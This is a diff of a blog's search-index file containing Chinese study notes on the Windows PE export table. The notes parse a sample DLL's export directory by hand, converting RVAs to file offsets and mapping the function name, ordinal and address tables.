+</tr>
+<tr>
+<td>TimeDateStamp</td>
+<td>DWORD(4字节)</td>
+<td>时间戳</td>
+</tr>
+<tr>
+<td>MajorVersion</td>
+<td>WORD(2字节)</td>
+<td>未用</td>
+</tr>
+<tr>
+<td>MinorVersion</td>
+<td>WORD(2字节)</td>
+<td>未用</td>
+</tr>
+<tr>
+<td>Name</td>
+<td>DWORD(4字节)</td>
+<td>指向该导出表的文件名字符串</td>
+</tr>
+<tr>
+<td>Base</td>
+<td>DWORD(4字节)</td>
+<td>导出函数起始序号</td>
+</tr>
+<tr>
+<td>NumberOfFunctions</td>
+<td>DWORD(4字节)</td>
+<td>所有导出函数的个数</td>
+</tr>
+<tr>
+<td>NumberOfNames</td>
+<td>DWORD(4字节)</td>
+<td>以函数名字导出的函数个数</td>
+</tr>
+<tr>
+<td>AddressOfFunctions</td>
+<td>DWORD(4字节)</td>
+<td>导出函数地址表RVA</td>
+</tr>
+<tr>
+<td>AddressOfNames</td>
+<td>DWORD(4字节)</td>
+<td>导出函数名称表RVA</td>
+</tr>
+<tr>
+<td>AddressOfNameOrdinals</td>
+<td>DWORD(4字节)</td>
+<td>导出函数序号表RVA</td>
+</tr>
+</tbody></table>
+<p>解释几个比较重要的字段</p>
+<h4 id="Name"><a href="#Name" class="headerlink" title="Name"></a>Name</h4><p>该字段指示的地址指向了一个以”\0”结尾的字符串，字符串记录了导出表所在文件的最初文件名，因此就算后期重命名此PE文件，也可在name处找到最初文件名</p>
+<h4 id="Base："><a href="#Base：" class="headerlink" title="Base："></a>Base：</h4><p>该字段指出了导出函数序号的起始值。dll中第一个导出函数的序号并非从0开始，导出函数的编号等于从AddressOfFunction开始的序号加上这个值。大概意思是这样</p>
+<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211014205036689.png" alt="image-20211014205036689"></p>
+<p>如图所示，Func1的函数编号为nBase + 0 = 200h， Func2的函数编号为 nbase + 1 = 201h</p>
+<h4 id="NumberOfFunctions"><a href="#NumberOfFunctions" class="headerlink" title="NumberOfFunctions"></a>NumberOfFunctions</h4><p>该字段定义了文件中导出函数的总个数</p>
+<h4 id="NumberOfNames"><a href="#NumberOfNames" class="headerlink" title="NumberOfNames"></a>NumberOfNames</h4><p>在导出表中，有些函数是定义名字的，有些是没有定义名字的。该字段记录了所有定义名字函数的个数。如果这个值是0，则表示所有的函数都没有定义名字。NumbersOfNames一定小于等于NumbersOfFuctions</p>
+<h4 id="AddressOfNames"><a href="#AddressOfNames" class="headerlink" title="AddressOfNames"></a>AddressOfNames</h4><p>该值为一个指针。该指针指向的位置是一连串的DWORD值，这些值均指向了对应的定义了函数名的函数的字符串地址。这一连串的DWORD值的个数为NumberOfNames</p>
+<h4 id="AddressOfFunctions"><a href="#AddressOfFunctions" class="headerlink" title="AddressOfFunctions"></a>AddressOfFunctions</h4><p>该指针指向了全部导出函数的入口地址的起始。从入口地址开始为DWORD数组，数组的个数由NumbersOfFuctions决定</p>
+<p>导出函数的每一个地址<strong>按函数的编号顺序</strong>依次往后排开。在内存中，可以通过<strong>函数编号</strong>来定位某个函数的地址</p>
+<h4 id="AddressOfNameOrdinals"><a href="#AddressOfNameOrdinals" class="headerlink" title="AddressOfNameOrdinals"></a>AddressOfNameOrdinals</h4><p>该值也是一个指针，与AddressOfNames是<strong>一一对应</strong>关系</p>
+<p>不同的是，AddressOfNames指向的是字符串的指针数组，而AddressOfNameOrdinals则指向了该函数在AddressOfFunctions中的<strong>索引值</strong></p>
+<hr>
+<p>注意：<strong>索引值数据类型为WORD，而非DWORD</strong>。该值与函数编号是两个不同的概念，两者的关系为：</p>
+<p>索引值 = 编号 - Base</p>
+<h3 id="根据结构分析导出表"><a href="#根据结构分析导出表" class="headerlink" title="根据结构分析导出表"></a>根据结构分析导出表</h3><p>根据之前拿到的导出表FOA + 40 - 1 ，拿到导出表范围，自0x79B0 至0x79D7</p>
+<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211015093614192.png" alt="image-20211015093614192"></p>
+<table>
+<thead>
+<tr>
+<th align="center">成员</th>
+<th>值</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">Characteristics</td>
+<td>0x00000000</td>
+<td>标志，未用</td>
+</tr>
+<tr>
+<td align="center">TimeDateStamp</td>
+<td>0xFFFFFFFF</td>
+<td>时间戳</td>
+</tr>
+<tr>
+<td align="center">MajorVersion</td>
+<td>0x0000</td>
+<td>未用</td>
+</tr>
+<tr>
+<td align="center">MinorVersion</td>
+<td>0x0000</td>
+<td>未用</td>
+</tr>
+<tr>
+<td align="center">Name</td>
+<td>0x0001900A</td>
+<td>指向该导出表文件名字符串</td>
+</tr>
+<tr>
+<td align="center">Base</td>
+<td>0x0000000A</td>
+<td>导出函数的起始序号</td>
+</tr>
+<tr>
+<td align="center">NumberOfFunctions</td>
+<td>0x00000008</td>
+<td>所有导出函数的个数</td>
+</tr>
+<tr>
+<td align="center">NumberOfNames</td>
+<td>0x00000003</td>
+<td>以函数名字导出的函数个数</td>
+</tr>
+<tr>
+<td align="center">AddressOfFunctions</td>
+<td>0x00018FD8</td>
+<td>导出函数地址表RVA</td>
+</tr>
+<tr>
+<td align="center">AddressOfNames</td>
+<td>0x00018FF8</td>
+<td>导出函数名称表RVA</td>
+</tr>
+<tr>
+<td align="center">AddressOfNameOrdinals</td>
+<td>0x00019004</td>
+<td>导出函数序号表RVA</td>
+</tr>
+</tbody></table>
+<h4 id="Name-1"><a href="#Name-1" class="headerlink" title="Name"></a>Name</h4><p>存储的值为指针，该指针为RVA(0x1900A)，同样需要转换成FOA</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">VaToFoa32</span>(nt-&gt;OptionalHeader.ImageBase+<span class="number">0x1900A</span>,dos,nt,sectionArr); <span class="comment">//0x1900A 为name的rva</span></span><br></pre></td></tr></table></figure>
+
+<p>运行可得</p>
+<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211015110233872.png" alt="image-20211015110233872"></p>
+<p>利用16进制编辑器得到0x7A0A,拿到Name,PE文件的文件名字符串，以00结尾，MyDll.dll</p>
+<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211015110551475.png" alt="image-20211015110551475"></p>
+<h4 id="Base"><a href="#Base" class="headerlink" title="Base"></a>Base</h4><p>导出函数起始序号的RVA 为 0xA , 对应十进制10</p>
+<p>回顾之前导出函数的定义</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">EXPORTS</span><br><span class="line">Add @<span class="number">12</span> </span><br><span class="line">Sub @<span class="number">15</span> NONAME</span><br><span class="line">Multiply @<span class="number">17</span></span><br><span class="line">Divide @<span class="number">10</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看出，此处的base=最小的序号=min{12,15,17,10}=10</p>
+<h4 id="NumberOfFunctions-1"><a href="#NumberOfFunctions-1" class="headerlink" title="NumberOfFunctions"></a>NumberOfFunctions</h4><p>所有导出函数的个数为8</p>
+<p>为什么前面声明的导出函数只有4个，但这里显示的却会有八个？</p>
+<p>此处的NumberOfFunctions = 最大的序号减去最小的序号 +1 =17-10+1=8</p>
+<h4 id="NumberOfNames-1"><a href="#NumberOfNames-1" class="headerlink" title="NumberOfNames"></a>NumberOfNames</h4><p>以函数名字导出的函数个数为3，和定义声明中有名称的导出函数数量一致</p>
+<h4 id="AddressOfFunctions-1"><a href="#AddressOfFunctions-1" class="headerlink" title="AddressOfFunctions"></a>AddressOfFunctions</h4><p>存储的值为指针，该指针为RVA(0x18FD8)，同样需要转换为FOA</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">VaToFoa32</span>(nt-&gt;OptionalHeader.ImageBase+<span class="number">0x18FD8</span>,dos,nt,sectionArr);</span><br></pre></td></tr></table></figure>
+
+<p>利用之前的VA转FOA程序修改VaToFoa32代码处数值</p>
+<p>运行程序可得AddressOfFunctions处文件偏移为0x79D8,跳转到该地址</p>
+<p>根据AddressOfFunctions （DWORD）为数组且数组个数由NumbersOfFuctions决定，本dll文件NumberOfFunctions为8</p>
+<p>因此8x4=32（10进制字节数）</p>
+<p><strong>拿到每个函数的RVA</strong>.</p>
+<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211015112733536.png" alt="image-20211015112733536"></p>
+<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211015113610137.png" alt="image-20211015113610137"></p>
+<p>记录下每个导出函数的地址并转换为RVA为FOA得到</p>
+<table>
+<thead>
+<tr>
+<th>Oridinals（索引）</th>
+<th>序号(Base+ORIDINALS)</th>
+<th>导出函数地址(RVA)</th>
+<th>导出函数地址(FOA)</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0</td>
+<td>10+0 = 10</td>
+<td>0x00011320</td>
+<td>0x720</td>
+</tr>
+<tr>
+<td>1</td>
+<td>10+1=11</td>
+<td>0x00000000</td>
+<td></td>
+</tr>
+<tr>
+<td>2</td>
+<td>12</td>
+<td>0x00011302</td>
+<td>0x702</td>
+</tr>
+<tr>
+<td>3</td>
+<td>13</td>
+<td>0x00000000</td>
+<td></td>
+</tr>
+<tr>
+<td>4</td>
+<td>14</td>
+<td>0x00000000</td>
+<td></td>
+</tr>
+<tr>
+<td>5</td>
+<td>15</td>
+<td>0x000111EF</td>
+<td>0x5EF</td>
+</tr>
+<tr>
+<td>6</td>
+<td>16</td>
+<td>0x00000000</td>
+<td></td>
+</tr>
+<tr>
+<td>7</td>
+<td>17</td>
+<td>0x000111A4</td>
+<td>0x5A4</td>
+</tr>
+</tbody></table>
+<p>可以发现，只有4个函数存在有效地址，跟前方Mydll.dll定义的序号以及数量一致</p>
+<h4 id="AddressOfNames-1"><a href="#AddressOfNames-1" class="headerlink" title="AddressOfNames"></a>AddressOfNames</h4><p>内部存储着导出函数名称表的RVA</p>
+<p>存储的值为指针，该指针为RVA，同样需要转为FOA</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">VaToFoa32</span>(nt-&gt;OptionalHeader.ImageBase+<span class="number">0x18FF8</span>,dos,nt,sectionArr);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211015115246528.png" alt="image-20211015115246528"></p>
+<p>16进制编辑器直接跳转过去</p>
+<p>导出函数名称表 = 导出函数名称表单个大小(DWORD) * NumberOfNames值 = 4 * 3 = 12（十进制）</p>
+<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211015120351876.png" alt="image-20211015120351876"></p>
+<p>拿到所有导出函数名称的地址</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="number">0x00019014</span></span><br><span class="line"><span class="number">0x00019018</span></span><br><span class="line"><span class="number">0x0001901F</span></span><br></pre></td></tr></table></figure>
+
+<p>利用程序将RVA转为OA</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">VaToFoa32</span>(nt-&gt;OptionalHeader.ImageBase+<span class="number">0x19014</span>,dos,nt,sectionArr);</span><br><span class="line"><span class="built_in">VaToFoa32</span>(nt-&gt;OptionalHeader.ImageBase+<span class="number">0x19018</span>,dos,nt,sectionArr);</span><br><span class="line"><span class="built_in">VaToFoa32</span>(nt-&gt;OptionalHeader.ImageBase+<span class="number">0x1901F</span>,dos,nt,sectionArr);</span><br></pre></td></tr></table></figure>
+
+<p>按照顺序依次拿到</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">foa 7a14</span><br><span class="line">foa 7a18</span><br><span class="line">foa 7a1f</span><br></pre></td></tr></table></figure>
+
+<p>即得到有名称函数的名称地址为：</p>
+<table>
+<thead>
+<tr>
+<th>顺序索引</th>
+<th>RVA</th>
+<th>FOA</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>0x19014</td>
+<td>0x7A14</td>
+</tr>
+<tr>
+<td>2</td>
+<td>0x19018</td>
+<td>0x7A18</td>
+</tr>
+<tr>
+<td>3</td>
+<td>0x1901F</td>
+<td>0x7A1F</td>
+</tr>
+</tbody></table>
+<p>利用FOA与16进制编辑器拿到各自的函数名字符串</p>
+<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211015120841885.png" alt="image-20211015120841885"></p>
+<table>
+<thead>
+<tr>
+<th>顺序索引</th>
+<th>RVA</th>
+<th>FOA</th>
+<th>导出函数名称</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>0x19014</td>
+<td>0x7A14</td>
+<td>Add</td>
+</tr>
+<tr>
+<td>2</td>
+<td>0x19018</td>
+<td>0x7A18</td>
+<td>Divide</td>
+</tr>
+<tr>
+<td>3</td>
+<td>0x1901F</td>
+<td>0x7A1F</td>
+<td>Multiply</td>
+</tr>
+</tbody></table>
+<h4 id="AddressOfNameOrdinals-1"><a href="#AddressOfNameOrdinals-1" class="headerlink" title="AddressOfNameOrdinals"></a>AddressOfNameOrdinals</h4><p>存储的值为指针，指针为RVA，同样需要转为FOA在PE文件中读取</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">VaToFoa32</span>(nt-&gt;OptionalHeader.ImageBase+<span class="number">0x19004</span>,dos,nt,sectionArr);</span><br></pre></td></tr></table></figure>
+
+<p>获取foa为 7A04</p>
+<p>跳转至0x7A04位置</p>
+<p>由NumberOfFunctions可知共有3个有名函数</p>
+<p>因此Ordinals列表为 4x3=12</p>
+<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211015121856554.png" alt="image-20211015121856554"></p>
+<p>拿到有名称的Ordinals</p>
+<p>Ordinals的为Word型，共2个字节</p>
+<table>
+<thead>
+<tr>
+<th>顺序索引</th>
+<th>Oridinals</th>
+<th>序号(Oridinals+Base)</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>0x0002</td>
+<td>12</td>
+</tr>
+<tr>
+<td>2</td>
+<td>0x0000</td>
+<td>10</td>
+</tr>
+<tr>
+<td>3</td>
+<td>0x0007</td>
+<td>17</td>
+</tr>
+</tbody></table>
+<p>根据有名称函数的Oridinals结合前面得到的AddressOfFunctions和AdressOfNames，就可以得到函数的名称、函数的地址的关系</p>
+<table>
+<thead>
+<tr>
+<th>顺序索引</th>
+<th>Oridinals</th>
+<th>导出函数地址(RVA)</th>
+<th>导出函数地址(FOA)</th>
+<th>函数名称</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>0x0002</td>
+<td>0x00011302</td>
+<td>0x702</td>
+<td>Add</td>
+</tr>
+<tr>
+<td>2</td>
+<td>0x0000</td>
+<td>0x00011320</td>
+<td>0x720</td>
+<td>Divide</td>
+</tr>
+<tr>
+<td>3</td>
+<td>0x0007</td>
+<td>0x000111A4</td>
+<td>0x5A4</td>
+<td>Multiply</td>
+</tr>
+</tbody></table>
+<p>至此导出表分析完毕</p>
+<h3 id="由导出表获得导出函数"><a href="#由导出表获得导出函数" class="headerlink" title="由导出表获得导出函数"></a>由导出表获得导出函数</h3><p>从前面的分析中可以得知查询导出表有两个办法</p>
+<ul>
+<li>根据导出表函数名称获得导出函数地址</li>
+<li>根据导出表函数序号获得导出函数地址</li>
+</ul>
+<h4 id="函数名称获取导出函数地址"><a href="#函数名称获取导出函数地址" class="headerlink" title="函数名称获取导出函数地址"></a>函数名称获取导出函数地址</h4><ol>
+<li>根据导出表的函数名称去AddressOfNames指向的每个名称字符串查询是否有匹配的字符串</li>
+<li>找到匹配的字符串后，根据找到的顺序索引去AddressOfNameOrdinals中找到对应的Ordinals</li>
+<li>根据前面找到的Ordinals到AddressOfFunctions中获得函数地址</li>
+</ol>
+<p>图示</p>
+<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211015125252798.png" alt="image-20211015125252798"></p>
+<h4 id="函数序号取得导出函数"><a href="#函数序号取得导出函数" class="headerlink" title="函数序号取得导出函数"></a>函数序号取得导出函数</h4><ol>
+<li>根据函数序号-导出表.Base获得导出函数的Ordinal</li>
+<li>根据前面拿到的Ordinals到AddressOfFunctions中获得函数地址</li>
+</ol>
+<p>图示</p>
+<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211015125443438.png" alt="image-20211015125443438"></p>
+<p>也可利用工具得出导出表的RVA,后利用RVA转FOA可获得其文件偏移量</p>
+<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211015125801883.png" alt="image-20211015125801883"></p>
+<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211015130012615.png" alt="image-20211015130012615"></p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul>
+<li>导出表中还包含了三张小表:导出函数地址表、导出函数名称表</li>
+<li>导出表中存储了指向这三张表的指针，而不是直接存储表内的内容</li>
+<li>无论是根据函数名称还是函数序号来获取导出函数，都需要用到Ordinals,用Ordinals到导出函数地址表中获取地址</li>
+<li>导出表的Base取决于编写DLL时导出定义的最小序号</li>
+<li>导出表的NumberOfFuctions取决于编写DLL时导出定义的序号最大差值+1</li>
+<li>导出名称表和导出函数序号表只对有名称的导出函数有效</li>
+</ul>
+<p>学习复现自52pojie论坛内的lyl640abc 师傅的pe笔记系列</p>
+]]></content>
+      <categories>
+        <category>PE结构</category>
+      </categories>
+      <tags>
+        <tag>PE结构</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>PE结构-PE文件的两种状态</title>
     <url>/2021/11/16/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81/</url>
     <content><![CDATA[<p>本文的是学习复现自吾爱破解dalao <a href="https://www.52pojie.cn/thread-1393291-1-1.html">lyl610abc</a>的PE文件解析系列，非本人原创，属于学习笔记(大佬yyds!)。</p>
@@ -2351,539 +2884,6 @@
 </ul>
 <p>另：函数相应的RVA地址是根据IAT中的函数名称或者导入表中的序号获得的。</p>
 <h4 id="根据结构分析导入表"><a href="#根据结构分析导入表" class="headerlink" title="根据结构分析导入表"></a>根据结构分析导入表</h4><p>回到先前得到的导入表的FOA，在16进制编辑器中跳转至FOA：0x1CDA7C位置</p>
-]]></content>
-      <categories>
-        <category>PE结构</category>
-      </categories>
-      <tags>
-        <tag>PE结构</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>PE结构-导出表(3)</title>
-    <url>/2021/10/14/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8(3)/</url>
-    <content><![CDATA[<h1 id="导出表"><a href="#导出表" class="headerlink" title="导出表"></a><strong>导出表</strong></h1><h4 id="导出表的作用"><a href="#导出表的作用" class="headerlink" title="导出表的作用"></a><strong>导出表的作用</strong></h4><p>一个可执行程序是由<strong>多个PE文件</strong>构成的</p>
-<p>利用EverEdit.exe为例，查看运行他所需的所有模块</p>
-<p>使用od载入程序，利用<em>e</em>查看载入的模块（dll与exe程序，PE文件载入内存后可称作模块）</p>
-<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211015112208833.png" alt="image-20211015112208833"></p>
-<p>我们可以看出，该程序除了载入自身exe程序外，还在外部动态链接了大量dll文件，这些dll为程序提供了运行所需的一些函数</p>
-<p>就比如MessageBoxA的弹窗函数就是由User32.dll模块提供</p>
-<p>以上的每个模块都发挥着其作用，使得程序得以正常运行</p>
-<p>一个程序引用哪些模块是由<strong>其导入表</strong>决定的</p>
-<p>与导入表相对应的便是<strong>导出表</strong>，导出表则是决定当前PE文件<strong>能给其他PE文件提供的函数</strong></p>
-<p>拿User32.dll举例，它的导出表结构中，一定包含着MessageBoxA这个函数,否则它不可能提供这个函数给程序。</p>
-<hr>
-<p><strong>导入表与导出表概念总结</strong>:</p>
-<ul>
-<li>导出表:设置本PE文件可以将什么函数提供给其他PE文件</li>
-<li>导入表:该PE文件可以使用哪些PE文件。</li>
-</ul>
-<p><strong>个人理解</strong>，PE文件中的导入表像是C/C++中的#include <xxx> 包含另一个文件来使用其中的函数，导出表便是其头文件，可使用的函数便是头文件中所声明的函数那般。</xxx></p>
-<h2 id="何为导出表？"><a href="#何为导出表？" class="headerlink" title="何为导出表？"></a>何为导出表？</h2><p>导出表便是记录该PE文件提供给其他PE文件的函数的一种结构</p>
-<h3 id="定位导出表"><a href="#定位导出表" class="headerlink" title="定位导出表"></a>定位导出表</h3><h4 id="定位导出表的原理"><a href="#定位导出表的原理" class="headerlink" title="定位导出表的原理"></a>定位导出表的原理</h4><p>导出表的定位可以利用PE文件_IMAGE_OPTIONAL_HEADER32中的DataDirectory结构进行定位。</p>
-<p>DataDirecoty是一个长为16的数组，<strong>每个数组成员对应一个表</strong></p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">成员										数据宽度</span><br><span class="line"></span><br><span class="line">DataDirectory[<span class="number">16</span>] 	IMAGE_DATA_DIRECTORY[<span class="number">16</span>]=<span class="number">128</span>字节</span><br></pre></td></tr></table></figure>
-
-<p>数据目录中共有16个表</p>
-<p>根据表的结构可知，导出表的下标为0</p>
-<p>即DataDirectory[0]表示导出表</p>
-<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211014165215769.png" alt="image-20211014165215769"></p>
-<p>根据c语言中，该成员在扩展PE头中的定义</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];</span><br></pre></td></tr></table></figure>
-
-<p>可以看到数组成员的结构为IMAGE_DATA_DIRECTORY</p>
-<p><strong>IMAGE_DATA_DIRECTORY</strong></p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_DATA_DIRECTORY</span> &#123;</span></span><br><span class="line">    DWORD   VirtualAddress;</span><br><span class="line">    DWORD   Size;</span><br><span class="line">&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;</span><br></pre></td></tr></table></figure>
-
-<p>这样的结构于扩展PE头内有15个</p>
-<table>
-<thead>
-<tr>
-<th>IMAGE_DATA_DIRECTORY成员</th>
-<th>数据宽度</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>VirtualAddress</td>
-<td>DWORD(4字节)</td>
-<td>表的起始位置（RVA）</td>
-</tr>
-<tr>
-<td>Size</td>
-<td>DWORD(4字节)</td>
-<td>表的大小</td>
-</tr>
-</tbody></table>
-<p>VirtualAddress 意为一个相对虚拟地址(RVA)</p>
-<p>Size： 表的大小</p>
-<p>根据VirtualAddress 与 Size 可求出该表的范围。</p>
-<p>同时，IMAGE_DATA_DIRECTORY<strong>仅仅记录表的位置和大小，没有描述表的具体结构</strong></p>
-<h4 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h4><p>1.找到IMAGE_OPTIONAL_HEADER32的最后一个成员DataDirectory</p>
-<p>2.获取DataDirectory[0]</p>
-<p>3.根据DataDirectory[0].virtualAddress得到导出表的RVA</p>
-<p>4.将导出表的RVA转换为FOA，利用16进制编辑器定位导出表</p>
-<p>RVA = 区块.VirtualAddress + 差值</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">### RVA 转 FOA 计算方式</span><br><span class="line"></span><br><span class="line">若RVA不在PE头内:</span><br><span class="line"></span><br><span class="line">差值 = RVA - 区块.VirtualAddress</span><br><span class="line"></span><br><span class="line">FOA = 区块.PointerToRawData + 差值</span><br><span class="line"></span><br><span class="line">若在PE头内:</span><br><span class="line"></span><br><span class="line">RVA = FOA</span><br></pre></td></tr></table></figure>
-
-<p><strong>分析实例</strong></p>
-<p>以lyl610abc师傅于文中公布的dll文件为例，进行调试</p>
-<p>导出函数的声明定义</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">EXPORTS</span><br><span class="line">Add @<span class="number">12</span> </span><br><span class="line">Sub @<span class="number">15</span> NONAME</span><br><span class="line">Multiply @<span class="number">17</span></span><br><span class="line">Divide @<span class="number">10</span></span><br></pre></td></tr></table></figure>
-
-<p>具体导出函数定义</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> _stdcall <span class="title">Add</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> x+y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> _stdcall <span class="title">Sub</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> x-y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> _stdcall <span class="title">Multiply</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> x * y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> _stdcall <span class="title">Divide</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> x / y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h4 id="找到DataDirectory"><a href="#找到DataDirectory" class="headerlink" title="找到DataDirectory"></a>找到DataDirectory</h4><p>由于DataDirectory数据目录本身在PE头的扩展头部分，因此我们需要先获取到PE头的起始位，再根据IMAGE_NT_HEADERS结构的PE文件头标志大小+标准PE头大小达到扩展PE头：</p>
-<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211014191938589.png" alt="image-20211014191938589"></p>
-<p>演示DLL文件为PE32文件，因此PE格式的标准头文件为 IMAGE_NT_HEADERS：</p>
-<p>扩展PE头首地址:0xF8+0x4+0x14(20) = 0x110</p>
-<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211014192704811.png" alt="image-20211014192704811"></p>
-<p>同时扩展PE头大小为224 字节，数据目录(DATADirectory大小) = _IMAGE_DATA_DIRECTORY大小*16 = 8 *16 = 128</p>
-<p>因此224 - 128 = 96个字节</p>
-<p>因此扩展PE头起始地址+ 96字节后为DataDirectory结构的起始地址</p>
-<p>DataDirectory起始地址 = 扩展头地址+ 0x60(96) = 0x110 + 0x60 = 0x110 </p>
-<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211014195234440.png" alt="image-20211014195234440"></p>
-<p>由此拿到DataDirectory，顺序排放DataDirectory[0] ~ DataDirectory[15] 8字节一张表</p>
-<p>DataDirectory[0] 对应着导出表</p>
-<table>
-<thead>
-<tr>
-<th>IMAGE_DATA_DIRECTORY成员</th>
-<th>值</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>VirtualAddress</td>
-<td>0x00018FB0</td>
-<td>表的起始位置（RVA）</td>
-</tr>
-<tr>
-<td>Size</td>
-<td>0x00000190</td>
-<td>表的大小</td>
-</tr>
-</tbody></table>
-<h4 id="得到导出表的RVA"><a href="#得到导出表的RVA" class="headerlink" title="得到导出表的RVA"></a>得到导出表的RVA</h4><p>根据结构拿到导出表<strong>RVA</strong>值为: 0x018FB0</p>
-<p>导出表的<strong>size</strong>为: 0x0190</p>
-<h4 id="RVA转换FOA"><a href="#RVA转换FOA" class="headerlink" title="RVA转换FOA"></a><strong>RVA转换FOA</strong></h4><p>但是IMAGE_DATA_DIRECTORY中的VirtualAddress 是RVA它在内存中才有的用， 在磁盘文件下需要将其转换成FOA</p>
-<p>直接利用代码获取对应的FOA:</p>
